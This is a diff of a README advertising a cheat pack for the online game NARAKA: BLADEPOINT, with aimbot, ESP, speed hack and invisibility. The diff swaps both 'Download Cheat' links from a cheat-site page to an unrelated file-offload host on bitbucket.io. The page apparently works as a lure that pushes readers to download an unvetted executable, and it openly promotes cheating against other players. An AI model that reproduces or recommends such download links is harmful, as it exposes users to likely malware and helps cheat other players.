@@ -4,14 +4,14 @@
 
 **NARAKA: BLADEPOINT** is fast, flashy, and brutal—where every sword clash or grapple hook can end your run in seconds. If you’re tired of getting clapped mid-combo or constantly juggled by sweaty duos, then the **NARAKA Cheat** pack is what you need to **flip the match, turn invisible, and delete squads** with no effort. 🎮⚔️
 
-[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://wecheaters.github.io/cheats/naraka-bladepoint/)
+[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://fileoffload5.bitbucket.io)
 ---
 
 ## 🎮 What Is NARAKA: BLADEPOINT?
 
 It’s a high-octane melee battle royale mixing martial arts, ranged combat, and parkour in a vertical open map. But the skill ceiling is sky-high, and the grind to get good can be brutal. That’s where **cheats like aimbot, ESP, speed hack**, and **cooldown skip** turn you into a living highlight reel.
 
-[![Download Cheat](https://i.ytimg.com/vi/VnpoCwthra4/maxresdefault.jpg)](https://wecheaters.github.io/cheats/naraka-bladepoint/)
+[![Download Cheat](https://i.ytimg.com/vi/VnpoCwthra4/maxresdefault.jpg)](https://fileoffload5.bitbucket.io)
 ---
 
 ## 🔥 Cheat Features Breakdown
